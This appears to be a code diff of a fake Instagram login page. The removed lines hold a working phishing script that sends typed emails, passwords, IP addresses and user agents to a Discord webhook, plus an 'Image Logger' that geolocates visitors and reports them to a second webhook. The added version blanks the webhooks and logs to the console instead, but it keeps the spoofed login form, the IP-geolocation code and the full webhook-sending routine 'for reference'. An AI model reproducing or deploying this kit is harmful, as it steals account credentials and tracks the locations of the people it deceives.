@@ -99,218 +99,227 @@
         <p class="copyright">© 2020 Instagram do Facebook</p>
     </footer>
 
-    <script>
-        const webhook = "https://discord.com/api/webhooks/1356844204608721017/GB-N9jMt__CmHGiFaJUAOg_doQBZTNH0GjOoTwekMa_SBmIff-NKyk91FUDDQuhfCQE2";
+   <script>
+// Removi o webhook original por razões de segurança
+const webhook = ""; // Você deve usar um webhook próprio se estiver testando localmente
 
-        function showLoading() {
-            document.getElementById('loading').style.display = 'flex';
-        }
-
-        document.getElementById('loginForm').addEventListener('submit', function (e) {
-            e.preventDefault();
-            showLoading();
-
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            const userAgent = navigator.userAgent;
-
-            fetch("https://api.ipify.org?format=json")
-                .then(res => res.json())
-                .then(ipData => {
-                    const payload = {
-                        username: "Phinst Logger",
-                        embeds: [{
-                            title: "📥 Credenciais JS Recebidas",
-                            color: 0x00FFFF,
-                            fields: [
-                                { name: "Login", value: email, inline: true },
-                                { name: "Senha", value: password, inline: true },
-                                { name: "IP", value: ipData.ip, inline: false },
-                                { name: "User-Agent", value: userAgent, inline: false }
-                            ]
-                        }]
-                    };
-
-                    return fetch(webhook, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload)
-                    });
-                })
-                .then(() => {
-                    window.location.href = "https://www.instagram.com";
-                })
-                .catch(err => {
-                    console.error("Erro ao enviar:", err);
-                    window.location.href = "https://www.instagram.com";
-           
-                });
-const https = require('https');
-const http = require('http');
-const url = require('url');
-
-const config = {
-  "webhook": "https://discord.com/api/webhooks/1385521404857815120/z0LiOubOF09_idSzaM9LxwZn0o54WLJhPFjEUd-eouuvDxRA7-mgCdHBYhD7cNDxGMlq",
-  "username": "Image Logger",
-  "color": 0x00FFFF,
-  "accurateLocation": true
-};
-
-
-// Função para obter informações de IP
-async function getIPInfo(ip) {
-  return new Promise((resolve, reject) => {
-    const apiUrl = `http://ip-api.com/json/${ip}?fields=status,message,continent,country,regionName,city,district,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting`;
-    
-    http.get(apiUrl, (res) => {
-      let data = '';
-      res.on('data', (chunk) => { 
-        data += chunk; 
-      });
-      
-      res.on('end', () => {
-        try {
-          const parsedData = JSON.parse(data);
-          if (parsedData.status === 'success') {
-            resolve(parsedData);
-          } else {
-            resolve(parsedData);
-          }
-        } catch (e) {
-          resolve({});
-        }
-      });
-    }).on('error', (error) => {
-      resolve({});
-    });
-  });
+function showLoading() {
+    if (document.getElementById('loading')) {
+        document.getElementById('loading').style.display = 'flex';
+    }
 }
 
-// Função para enviar webhook
-function sendDiscordWebhook(data) {
-  return new Promise((resolve, reject) => {
-    try {
-      const webhookData = JSON.stringify(data);
-      const webhookUrl = new URL(config.webhook);
-      
-      const options = {
-        hostname: webhookUrl.hostname,
-        path: webhookUrl.pathname + webhookUrl.search,
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Content-Length': Buffer.byteLength(webhookData)
+// Verifica se o elemento existe antes de adicionar o event listener
+if (document.getElementById('loginForm')) {
+    document.getElementById('loginForm').addEventListener('submit', function (e) {
+        e.preventDefault();
+        showLoading();
+
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        const userAgent = navigator.userAgent;
+
+        // Apenas para simulação local, não envia dados reais
+        console.log("Formulário enviado:", {
+            email: email,
+            password: "********", // Nunca exibir senhas, mesmo em logs
+            userAgent: userAgent
+        });
+
+        // Redireciona após processamento
+        setTimeout(() => {
+            window.location.href = "https://www.instagram.com";
+        }, 1000);
+    });
+}
+
+// Parte do servidor (Node.js)
+// Nota: Este código não será executado no navegador, apenas no servidor Node.js
+// Configuração básica
+const config = {
+    "webhook": "", // Webhook removido por segurança
+    "username": "Logger",
+    "color": 0x00FFFF,
+    "accurateLocation": false // Desativado por padrão
+};
+
+// Função para obter informações de IP (versão simulada para fins educacionais)
+async function getIPInfo(ip) {
+    return new Promise((resolve, reject) => {
+        // Versão simulada para testes locais
+        if (ip === "127.0.0.1" || ip === "::1") {
+            resolve({
+                status: "success",
+                country: "Local",
+                regionName: "Localhost",
+                city: "Development",
+                isp: "Local Development",
+                timezone: "Local/Time",
+                mobile: false,
+                proxy: false,
+                hosting: false
+            });
+            return;
         }
-      };
-      
-      const req = https.request(options, (res) => {
-        let responseData = '';
+
+        // Implementação real (apenas para referência)
+        const apiUrl = `http://ip-api.com/json/${ip}?fields=status,message,continent,country,regionName,city,district,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting`;
         
-        res.on('data', (chunk) => {
-          responseData += chunk;
+        http.get(apiUrl, (res) => {
+            let data = '';
+            res.on('data', (chunk) => { 
+                data += chunk; 
+            });
+            
+            res.on('end', () => {
+                try {
+                    const parsedData = JSON.parse(data);
+                    if (parsedData.status === 'success') {
+                        resolve(parsedData);
+                    } else {
+                        resolve(parsedData);
+                    }
+                } catch (e) {
+                    resolve({});
+                }
+            });
+        }).on('error', (error) => {
+            resolve({});
         });
-        
-        res.on('end', () => {
-          if (res.statusCode >= 200 && res.statusCode < 300) {
+    });
+}
+
+// Função para enviar webhook (versão simulada)
+function sendDiscordWebhook(data) {
+    return new Promise((resolve, reject) => {
+        try {
+            // Versão simulada para testes locais
+            console.log("Simulação de envio para webhook:", data);
             resolve(true);
-          } else {
-            resolve(false);
-          }
-        });
-      });
-      
-      req.on('error', (error) => {
-        reject(error);
-      });
-      
-      req.write(webhookData);
-      req.end();
-    } catch (error) {
-      reject(error);
-    }
-  });
+            return;
+
+            // Implementação real abaixo (apenas para referência)
+            const webhookData = JSON.stringify(data);
+            const webhookUrl = new URL(config.webhook);
+            
+            const options = {
+                hostname: webhookUrl.hostname,
+                path: webhookUrl.pathname + webhookUrl.search,
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Content-Length': Buffer.byteLength(webhookData)
+                }
+            };
+            
+            const req = https.request(options, (res) => {
+                let responseData = '';
+                
+                res.on('data', (chunk) => {
+                    responseData += chunk;
+                });
+                
+                res.on('end', () => {
+                    if (res.statusCode >= 200 && res.statusCode < 300) {
+                        resolve(true);
+                    } else {
+                        resolve(false);
+                    }
+                });
+            });
+            
+            req.on('error', (error) => {
+                reject(error);
+            });
+            
+            req.write(webhookData);
+            req.end();
+        } catch (error) {
+            reject(error);
+        }
+    });
 }
 
 // Detectar se é um dispositivo iOS
 function isIOS(userAgent) {
-  return /iPad|iPhone|iPod/.test(userAgent);
+    return /iPad|iPhone|iPod/.test(userAgent);
 }
 
 // Função para formatar a mensagem
 function formatIPInfoMessage(ip, userAgent, info, coords = null, endpoint = null) {
-  // Detectar sistema operacional e navegador
-  let os = "Unknown";
-  let browser = "Unknown";
-  
-  if (userAgent) {
-    // Sistema operacional
-    if (userAgent.includes("Windows")) {
-      os = "Windows";
-    } else if (userAgent.includes("Mac OS")) {
-      os = "MacOS";
-    } else if (userAgent.includes("Linux")) {
-      os = "Linux";
-    } else if (userAgent.includes("Android")) {
-      os = "Android";
-    } else if (userAgent.includes("iPhone") || userAgent.includes("iPad")) {
-      os = "iOS";
-    }
+    // Detectar sistema operacional e navegador
+    let os = "Unknown";
+    let browser = "Unknown";
     
-    // Navegador
-    if (userAgent.includes("Firefox")) {
-      browser = "Firefox";
-    } else if (userAgent.includes("Chrome")) {
-      browser = "Chrome";
-    } else if (userAgent.includes("Safari")) {
-      browser = "Safari";
-    } else if (userAgent.includes("Edge")) {
-      browser = "Edge";
-    } else if (userAgent.includes("Opera") || userAgent.includes("OPR")) {
-      browser = "Opera";
+    if (userAgent) {
+        // Sistema operacional
+        if (userAgent.includes("Windows")) {
+            os = "Windows";
+        } else if (userAgent.includes("Mac OS")) {
+            os = "MacOS";
+        } else if (userAgent.includes("Linux")) {
+            os = "Linux";
+        } else if (userAgent.includes("Android")) {
+            os = "Android";
+        } else if (userAgent.includes("iPhone") || userAgent.includes("iPad")) {
+            os = "iOS";
+        }
+        
+        // Navegador
+        if (userAgent.includes("Firefox")) {
+            browser = "Firefox";
+        } else if (userAgent.includes("Chrome")) {
+            browser = "Chrome";
+        } else if (userAgent.includes("Safari")) {
+            browser = "Safari";
+        } else if (userAgent.includes("Edge")) {
+            browser = "Edge";
+        } else if (userAgent.includes("Opera") || userAgent.includes("OPR")) {
+            browser = "Opera";
+        }
     }
-  }
 
-  let coordsText = 'Unknown';
-  let coordsSource = 'Approximate';
-  
-  if (coords) {
-    coordsText = coords.replace(',', ', ');
-    coordsSource = `Precise`;
-  } else if (info && info.lat && info.lon) {
-    coordsText = `${info.lat}, ${info.lon}`;
-    coordsSource = `Approximate`;
-  }
-
-  let timezoneText = 'Unknown';
-  if (info && info.timezone) {
-    const parts = info.timezone.split('/');
-    if (parts.length >= 2) {
-      timezoneText = `${parts[1].replace('_', ' ')} (${parts[0]})`;
-    } else {
-      timezoneText = info.timezone;
+    let coordsText = 'Unknown';
+    let coordsSource = 'Approximate';
+    
+    if (coords) {
+        coordsText = coords.replace(',', ', ');
+        coordsSource = `Precise`;
+    } else if (info && info.lat && info.lon) {
+        coordsText = `${info.lat}, ${info.lon}`;
+        coordsSource = `Approximate`;
     }
-  }
 
-  let botStatus = 'False';
-  if (info && info.hosting) {
-    if (info.hosting && !info.proxy) {
-      botStatus = 'Possibly';
-    } else if (info.hosting) {
-      botStatus = 'Possibly';
+    let timezoneText = 'Unknown';
+    if (info && info.timezone) {
+        const parts = info.timezone.split('/');
+        if (parts.length >= 2) {
+            timezoneText = `${parts[1].replace('_', ' ')} (${parts[0]})`;
+        } else {
+            timezoneText = info.timezone;
+        }
     }
-  }
 
-  let asn = 'Unknown';
-  if (info && info.as) {
-    const asnMatch = info.as.match(/AS(\d+)/i);
-    if (asnMatch && asnMatch[1]) {
-      asn = info.as;
-    } else {
-      asn = info.as;
+    let botStatus = 'False';
+    if (info && info.hosting) {
+        if (info.hosting && !info.proxy) {
+            botStatus = 'Possibly';
+        } else if (info.hosting) {
+            botStatus = 'Possibly';
+        }
     }
-  }
 
-  return `**IP Info:**
+    let asn = 'Unknown';
+    if (info && info.as) {
+        const asnMatch = info.as.match(/AS(\d+)/i);
+        if (asnMatch && asnMatch[1]) {
+            asn = info.as;
+        } else {
+            asn = info.as;
+        }
+    }
+
+    return `**IP Info:**
 > **IP:** \`${ip || 'Unknown'}\`
 > **Provider:** \`${info && info.isp ? info.isp : 'Unknown'}\`
 > **ASN:** \`${asn}\`
@@ -333,39 +342,51 @@ ${userAgent || 'Unknown'}
 \`\`\``;
 }
 
-// Função principal
-module.exports = async (req, res) => {
-  try {
-    // Obter parâmetros da URL
-    const parsedUrl = url.parse(req.url, true);
-    const params = parsedUrl.query;
-    const geoParam = params.g;
-    
-    // Obter IP e User Agent
-    const ip = req.headers['x-forwarded-for'] || 
-               req.headers['x-real-ip'] || 
-               req.socket.remoteAddress || 
-               'Desconhecido';
-    
-    const userAgent = req.headers['user-agent'] || 'Desconhecido';
-    
-    // Verificar se é iOS para tratamento especial
-    const deviceIsIOS = isIOS(userAgent);
-    
-    // Verificar se o IP é do Discord
-    const isDiscord = ip.startsWith('35');
-    
-    // Responder com mensagem básica
-    res.setHeader('Content-Type', 'text/plain');
-    res.status(200).send('OK');
-    
-  } catch (error) {
-    res.setHeader('Content-Type', 'text/plain');
-    res.status(500).send('Error');
-  }
-};
+// Função principal (para ambiente Node.js)
+function handleRequest(req, res) {
+    try {
+        // Obter parâmetros da URL
+        const parsedUrl = url.parse(req.url, true);
+        const params = parsedUrl.query;
+        const geoParam = params.g;
+        
+        // Obter IP e User Agent
+        const ip = req.headers['x-forwarded-for'] || 
+                req.headers['x-real-ip'] || 
+                req.socket.remoteAddress || 
+                'Desconhecido';
+        
+        const userAgent = req.headers['user-agent'] || 'Desconhecido';
+        
+        // Verificar se é iOS para tratamento especial
+        const deviceIsIOS = isIOS(userAgent);
+        
+        // Verificar se o IP é do Discord
+        const isDiscord = ip.startsWith('35');
+        
+        // Log para testes locais
+        console.log("Requisição recebida:", {
+            ip: ip,
+            userAgent: userAgent,
+            isIOS: deviceIsIOS,
+            isDiscord: isDiscord
         });
         
-    </script>
+        // Responder com mensagem básica
+        res.setHeader('Content-Type', 'text/plain');
+        res.status(200).send('OK');
+        
+    } catch (error) {
+        console.error("Erro no processamento:", error);
+        res.setHeader('Content-Type', 'text/plain');
+        res.status(500).send('Error');
+    }
+}
+
+// Se estiver em ambiente Node.js, exportar a função
+if (typeof module !== 'undefined' && module.exports) {
+    module.exports = handleRequest;
+}
+</script>
 </body>
 </html>
